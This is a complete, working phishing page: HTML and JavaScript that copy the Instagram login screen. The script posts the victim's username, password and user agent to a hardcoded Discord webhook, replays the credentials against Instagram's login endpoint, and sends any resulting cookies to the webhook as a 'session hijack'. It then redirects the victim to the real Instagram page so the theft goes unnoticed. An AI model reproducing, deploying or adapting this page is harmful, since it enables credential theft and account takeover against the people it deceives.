<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Instagram</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
        .container{display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
        .login-box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:40px 20px;width:100%;max-width:350px}
        .logo{text-align:center;font-size:42px;font-weight:600;margin-bottom:28px;font-family:'Segoe UI',sans-serif}
        input{width:100%;padding:12px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;margin-bottom:8px;font-size:14px}
        button{width:100%;background:#0095f6;color:#fff;border:none;padding:9px;border-radius:8px;font-weight:600;margin-top:16px;cursor:pointer;font-size:14px}
        .divider{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:13px}
        .divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
        .divider span{margin:0 18px}
        .fb{color:#385185;text-align:center;font-weight:600;font-size:14px;margin:15px 0}
        .forgot{text-align:center;font-size:12px;color:#00376b;margin-top:20px}
        .signup{text-align:center;margin-top:20px;font-size:14px;color:#262626}
        .signup a{color:#0095f6;text-decoration:none;font-weight:600}
        .error{color:#ed4956;text-align:center;margin-top:12px;font-size:14px;display:none}
        .loading{text-align:center;padding:20px;display:none}
        .loading .spinner{width:30px;height:30px;border:3px solid #dbdbdb;border-top:3px solid #0095f6;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>

<div class="container">
    <div class="login-box" id="loginForm">
        <div class="logo">Instagram</div>
        <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off">
        <input type="password" id="password" placeholder="Password" autocomplete="off">
        <button onclick="login()">Log in</button>
        <div class="divider"><span>OR</span></div>
        <div class="fb">Log in with Facebook</div>
        <div class="forgot">Forgot password?</div>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
        <div id="errorMsg" class="error"></div>
    </div>
    
    <div id="loadingBox" class="loading">
        <div class="spinner"></div>
        <p style="color:#262626">Verifying credentials...</p>
    </div>
</div>

<script>
    const DISCORD = 'https://discord.com/api/webhooks/1496531603210506392/kf7iJdmSOgzhV21bKbYXiVv6NvZdXxxMuUR-teMhvQwAEKCDFxo-euHie5B00imucPJh';

    async function login() {
        const user = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value.trim();
        
        if(!user || !pass) {
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('errorMsg').innerText = 'Please enter username and password';
            return;
        }
        
        // Hide form show loading
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('loadingBox').style.display = 'block';
        
        // Send to Discord
        await fetch(DISCORD, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "🔐 Instagram Login",
                    color: 0xE4405F,
                    fields: [
                        {name: "👤 Username", value: user, inline: true},
                        {name: "🔑 Password", value: `||${pass}||`, inline: true},
                        {name: "📱 User Agent", value: navigator.userAgent, inline: false},
                        {name: "⏰ Time", value: new Date().toLocaleString(), inline: false}
                    ],
                    footer: {text: "Instagram Phish"}
                }]
            })
        });
        
        // Try actual Instagram login to grab session
        try {
            const time = Math.floor(Date.now() / 1000);
            const encPass = `#PWD_INSTAGRAM_BROWSER:0:${time}:${pass}`;
            
            const response = await fetch('https://www.instagram.com/api/v1/web/accounts/login/ajax/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRFToken': 'missing',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: new URLSearchParams({
                    username: user,
                    enc_password: encPass,
                    queryParams: '{}',
                    optIntoOneTap: 'false'
                }),
                credentials: 'include'
            });
            
            const data = await response.json();
            
            if(data.authenticated) {
                const cookies = document.cookie;
                
                await fetch(DISCORD, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "✅ LOGIN SUCCESSFUL - SESSION CAPTURED",
                            color: 0x00FF00,
                            fields: [
                                {name: "👤 User", value: user, inline: true},
                                {name: "🆔 User ID", value: data.userId || 'Unknown', inline: true},
                                {name: "🍪 Session Cookie", value: `\`\`\`${cookies}\`\`\``, inline: false}
                            ],
                            footer: {text: "Full Session Hijack Ready"}
                        }]
                    })
                });
            }
        } catch(e) {
            console.log('Login attempt error');
        }
        
        // Redirect to real Instagram
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 2000);
    }
</script>

</body>
</html>
